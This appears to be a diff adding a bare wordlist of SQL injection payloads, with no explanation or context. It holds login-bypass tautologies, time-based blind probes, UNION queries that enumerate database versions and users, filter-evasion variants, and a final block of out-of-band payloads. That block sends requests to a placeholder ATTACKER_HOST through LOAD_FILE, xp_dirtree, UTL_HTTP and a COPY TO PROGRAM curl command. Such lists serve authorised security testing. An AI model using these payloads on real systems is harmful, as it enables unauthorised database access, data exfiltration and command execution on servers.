@@ -1,0 +1,77 @@
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+" OR "1"="1" --
+' AND 1=1 --
+' AND 1=2 --
+' OR 1=1 --
+' OR 1=1#
+admin' --
+admin' #
+' OR TRUE --
+" OR TRUE --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND 1=(SELECT COUNT(*) FROM sysusers WHERE name='sa') --
+' AND IF(1=1, SLEEP(5), 0) --
+' AND IF(1=1, SLEEP(10), 0) --
+' AND SLEEP(5) --
+' AND SLEEP(10) --
+' AND pg_sleep(5) --
+' AND 1=1; pg_sleep(5) --
+1 AND IF(1=1, SLEEP(5), 0) --
+' OR SLEEP(5) --
+'; WAITFOR DELAY '0:0:5' --
+' WAITFOR DELAY '00:00:05' --
+'; IF (1=1) WAITFOR DELAY '00:00:05' --
+' OR 1=1; WAITFOR DELAY '00:00:05' --
+' AND 1=1; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --
+' AND BENCHMARK(5000000, MD5('A')) --
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4,5,6--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1,@@version#
+' UNION SELECT @@version--
+' UNION SELECT null,@@datadir#
+' UNION SELECT database(),user(),version()--
+' UNION SELECT @@datadir,@@hostname,@@port--
+' UNION SELECT banner FROM v$version--
+' UNION SELECT @@version,db_name(),system_user--
+' AND (SELECT COUNT(*) FROM mysql.user)#
+' AND 1=CAST(version() AS INTEGER)--
+' AND 1=(SELECT 1 FROM DUAL WHERE 1=1)--
+/**/UNION/**/SELECT/**/1,2,3--
+' UNION/**/SELECT/**/NULL,NULL,NULL--
++UNION+SELECT+1,2,3--
+UNION%23SELECT%231,2,3--
+uNiOn SeLeCt 1,2,3--
+1' AND SLEEP(5) -- 
+1' OR IF(1=1, SLEEP(5), 0) -- 
+1' UNION SELECT NULL,NULL,NULL WHERE 1=IF((LENGTH(DATABASE())>5),SLEEP(5),0)--
+1' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))=65,SLEEP(5),0)--
+1' -- 
+1' #
+1' /*
+1' OR '1'='1' #
+1' AND 1=1 -- 
+1' OR 1=1 #
+' UNION SELECT LOAD_FILE(CONCAT('\\\\', 'ATTACKER_HOST', '\\a.txt')) --
+' UNION SELECT LOAD_FILE(CONCAT('\\\\', 'ATTACKER_HOST', '\\foobar')) --
+'; EXEC master..xp_dirtree '\\\\ATTACKER_HOST\\a' --
+'; EXEC master..xp_fileexist '\\\\ATTACKER_HOST\\a' --
+' AND (SELECT LOAD_FILE(CONCAT('\\\\', 'ATTACKER_HOST', '\\a.txt'))) --
+' OR (SELECT LOAD_FILE(CONCAT('\\\\', 'ATTACKER_HOST', '\\a.txt'))) --
+' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\','ATTACKER_HOST','\\payload')) --
+' AND LOAD_FILE(CONCAT('\\\\','ATTACKER_HOST','\\payload')) --
+' ; EXEC xp_dirtree '\\\\ATTACKER_HOST\\payload' --
+' ; EXEC xp_fileexist '\\\\ATTACKER_HOST\\payload' --
+' ; EXEC master..xp_dirtree '\\\\ATTACKER_HOST\\payload' --
+' ; COPY (SELECT 'OOB Test') TO PROGRAM 'curl http://ATTACKER_HOST/payload' --
+' ; COPY (SELECT 'check') TO PROGRAM 'curl http://ATTACKER_HOST/check' --
+' AND UTL_HTTP.REQUEST('http://ATTACKER_HOST/payload') --
+' UNION SELECT UTL_HTTP.REQUEST('http://ATTACKER_HOST/data') FROM DUAL --
+' AND UTL_INADDR.GET_HOST_ADDRESS('ATTACKER_HOST') --
+' ; CALL inject_data('http://ATTACKER_HOST/payload') --
+' ; CALL xp_dirtree('\\\\ATTACKER_HOST\\test') --
+' ; EXEC UTL_INADDR.GET_HOST_ADDRESS('ATTACKER_HOST') --
+' ; EXEC UTL_HTTP.REQUEST('http://ATTACKER_HOST/payload') --
